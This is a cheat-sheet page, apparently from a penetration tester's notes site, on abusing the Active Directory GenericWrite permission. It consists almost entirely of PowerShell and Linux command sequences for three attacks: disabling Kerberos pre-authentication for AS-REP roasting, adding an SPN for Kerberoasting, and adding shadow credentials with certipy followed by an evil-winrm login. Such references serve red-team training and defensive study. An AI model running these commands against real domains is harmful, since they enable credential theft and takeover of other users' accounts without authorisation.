---
title: "GenericWrite"
date: 2024-7-13
tags: ["GenericWrite", "active driectory", "ad", "Windows"]
---

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1 

<div>

```console
. .\PowerView.ps1
```

</div>

#### 2. Check target user

<div>

```console
Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
```

</div>

#### 3. Add UF_DONT_REQUIRE_PREAUTH bit

<div>

```console
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
```

</div>

#### 4. AS-REP Roasting

<div>

```console
# In local linux machine
impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
```

</div>

{{< /tabcontent >}}

<br>

---

### Abuse #2 : Kerberoasting by adding spn

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView.ps1

<div>

```console
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Add SPN

<div>

```console
# Add spn (e.g. MSSQL)
setspn -a MSSQLSvc/<TARGET_DOMAIN>:1433 <DOMAIN>\<TARGET_USER>
```

```console
# Check
Get-DomainUser <TARGET_USER> | Select serviceprincipalname
```

</div>

#### 4. Get SPN

<div>

```console
Get-DomainSPNTicket -SPN "MSSQLSvc/<DOMAIN>:1433" -Credential $Cred
```

</div>

{{< /tabcontent >}}

<br>

---

### Abuse #3: Add shadow credentials

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```console
# Request a ticket
kinit <USER>
```

```console
# Import ticket
export KRB5CCNAME=/tmp/krb5cc_1000
```

```console
# Pre-check (Optional)
certipy-ad find -username <USER>@<DOMAIN> -k -target <TARGET_DOMAIN>
```

```console
# Add shadow credentials
certipy-ad shadow auto -username <USER>@<DOMAIN> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

```console
# Remote with kerberos
KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

</div>

{{< /tabcontent >}}

<br>